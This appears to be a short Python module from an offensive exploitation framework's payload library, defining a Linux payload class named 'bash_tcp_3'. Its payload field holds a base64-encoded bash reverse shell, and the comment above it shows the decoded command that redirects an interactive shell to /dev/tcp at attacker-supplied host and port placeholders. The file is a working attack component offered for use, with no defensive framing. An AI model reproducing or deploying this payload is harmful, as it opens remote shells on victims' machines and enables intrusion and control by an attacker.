from lib.framework.core.payload import Payload


# bash -l > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1
class bash_tcp_3(Payload):
    name = "bash_tcp_3"
    platform = ["linux"]
    payload = "YmFzaCAtbCA+IC9kZXYvdGNwL3tMSE9TVH0ve0xQT1JUfSAwPCYxIDI+JjE="
